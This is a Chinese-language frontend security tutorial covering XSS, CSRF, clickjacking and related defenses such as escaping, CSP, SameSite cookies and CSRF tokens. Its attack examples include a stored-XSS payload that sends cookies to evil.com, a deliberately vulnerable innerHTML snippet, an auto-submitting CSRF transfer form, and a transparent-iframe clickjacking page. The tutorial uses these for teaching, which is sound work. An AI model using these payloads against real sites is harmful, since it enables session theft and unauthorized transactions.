---
title: 前端安全
---

# 前端安全

前端安全是保护 Web 应用免受恶意攻击的重要领域，了解常见攻击手段和防御策略是高级前端工程师的必备技能。

## 常见攻击类型

| 攻击类型 | 原理 | 危害 |
|---------|------|------|
| XSS | 注入恶意脚本 | 窃取Cookie、篡改页面、钓鱼 |
| CSRF | 伪造用户请求 | 冒充用户操作 |
| 点击劫持 | 透明iframe覆盖 | 诱导用户点击 |
| 中间人攻击 | 拦截通信数据 | 窃取敏感信息 |
| SQL注入 | 恶意SQL语句 | 数据泄露、篡改 |

## XSS 攻击与防御

### 攻击方式

```javascript
// 1. 存储型 XSS - 恶意代码存入数据库
// 用户提交评论：<script>document.location='https://evil.com?c='+document.cookie</script>

// 2. 反射型 XSS - URL 参数中包含恶意代码
// https://example.com/search?q=<script>alert('xss')</script>

// 3. DOM 型 XSS - 前端 JS 不当操作
const hash = location.hash.slice(1);
document.getElementById('output').innerHTML = decodeURIComponent(hash);
// 访问 #<img src=x onerror=alert(1)> 触发
```

### 防御策略

```javascript
// 1. 输出转义
function escapeHtml(str) {
  const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#039;' };
  return str.replace(/[&<>"']/g, c => map[c]);
}

// 2. 使用 textContent 代替 innerHTML
// ❌ element.innerHTML = userInput;
// ✅ element.textContent = userInput;

// 3. 使用 DOMPurify 清理 HTML
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(dirtyHtml);
element.innerHTML = clean;

// 4. Vue/React 自动转义
// Vue: {{ }} 自动转义，v-html 需谨慎
// React: {} 自动转义，dangerouslySetInnerHTML 需谨慎

// 5. CSP（内容安全策略）
// HTTP 头设置
// Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'

// HTML meta 标签
// <meta http-equiv="Content-Security-Policy" content="default-src 'self'">

// 6. HttpOnly Cookie
// Set-Cookie: token=abc123; HttpOnly; Secure; SameSite=Strict
```

## CSRF 攻击与防御

### 攻击原理

```html
<!-- 用户已登录 bank.com，访问恶意网站 -->
<!-- 恶意网站自动发送请求 -->
<img src="https://bank.com/transfer?to=hacker&amount=10000">

<!-- 或通过隐藏表单 -->
<form action="https://bank.com/transfer" method="POST" id="hack">
  <input type="hidden" name="to" value="hacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('hack').submit();</script>
```

### 防御策略

```javascript
// 1. CSRF Token
// 服务端生成随机 Token，表单提交时携带
<form>
  <input type="hidden" name="_token" value="{{ csrfToken }}">
</form>

// Axios 自动从 Cookie 读取 Token 放入 Header
axios.defaults.xsrfCookieName = 'XSRF-TOKEN';
axios.defaults.xsrfHeaderName = 'X-XSRF-TOKEN';

// 2. SameSite Cookie
// Set-Cookie: token=abc; SameSite=Strict
// Strict: 完全禁止第三方 Cookie
// Lax: 允许 GET 请求携带（默认值）
// None: 允许所有（需配合 Secure）

// 3. 验证 Referer / Origin
// 服务端检查请求来源
const referer = request.headers.referer;
if (!referer || !referer.startsWith('https://mysite.com')) {
  return response.status(403).json({ error: 'Forbidden' });
}

// 4. 避免GET修改数据
// ❌ GET /api/delete-user?id=1
// ✅ POST /api/delete-user { id: 1 }
```

## 点击劫持

### 攻击方式

```html
<!-- 透明 iframe 覆盖在按钮上 -->
<style>
  .transparent-iframe {
    position: absolute;
    top: 0;
    left: 0;
    width: 500px;
    height: 300px;
    opacity: 0.01; /* 几乎透明 */
    z-index: 10;
  }
</style>

<button class="decoy">点击领取奖品</button>
<iframe class="transparent-iframe" src="https://bank.com/transfer"></iframe>
```

### 防御策略

```javascript
// 1. X-Frame-Options 响应头
// X-Frame-Options: DENY           // 完全禁止嵌入
// X-Frame-Options: SAMEORIGIN     // 同源可嵌入

// 2. CSP 的 frame-ancestors 指令
// Content-Security-Policy: frame-ancestors 'self'

// 3. JavaScript 防御（frame-busting）
if (window.top !== window.self) {
  window.top.location = window.self.location;
}
```

## 其他安全实践

### 输入验证

```javascript
// 前端验证（用户体验）+ 后端验证（安全保障）

// 白名单验证
const allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
function validateFileType(file) {
  return allowedTypes.includes(file.type);
}

// 文件上传安全
function validateUpload(file) {
  const MAX_SIZE = 5 * 1024 * 1024; // 5MB
  if (file.size > MAX_SIZE) throw new Error('文件过大');
  if (!allowedTypes.includes(file.type)) throw new Error('不支持的文件类型');
  // 后端还需验证：文件内容、文件扩展名、病毒扫描
}
```

### 敏感数据处理

```javascript
// ❌ 不要在前端存储敏感信息
localStorage.setItem('password', '123456'); // 绝对不要！

// ✅ Token 存储策略
// 方案一：HttpOnly Cookie（推荐，防 XSS）
// 方案二：内存存储（最安全，刷新丢失）
let accessToken = '';
function setToken(token) { accessToken = token; }

// ✅ 日志脱敏
function maskSensitive(data) {
  return JSON.stringify(data).replace(
    /"password"\s*:\s*"[^"]*"/g,
    '"password":"***"'
  );
}
```

### HTTPS 与安全通信

```
// 确保全站 HTTPS
// 1. 强制 HTTPS 跳转
// 2. HSTS 头
// Strict-Transport-Security: max-age=31536000; includeSubDomains

// 前端安全请求
// ❌ mixed content（HTTPS 页面加载 HTTP 资源）
// ✅ 所有资源使用 HTTPS
```

### 依赖安全

```bash
# 检查依赖漏洞
npm audit
npm audit fix

# 使用 lock 文件锁定版本
# package-lock.json / pnpm-lock.yaml

# 定期更新依赖
npm outdated
npm update
```

## 安全检查清单

```
✅ 所有用户输入都经过验证和转义
✅ 使用 textContent 而非 innerHTML（或使用 DOMPurify）
✅ 设置 CSP 响应头
✅ Cookie 设置 HttpOnly + Secure + SameSite
✅ 使用 CSRF Token 保护表单
✅ 设置 X-Frame-Options 防止点击劫持
✅ 全站 HTTPS + HSTS
✅ 不在前端存储敏感信息
✅ 定期运行 npm audit
✅ 后端验证所有输入（不信任前端）
```

## 下一步

- 📦 [模块化工程](/frontend/advanced/modules/) - 工程化实践
- 🧠 [核心概念](/frontend/concepts/) - 前端核心概念
- 🎯 [实战训练](/frontend/concepts/practice/) - 项目实战
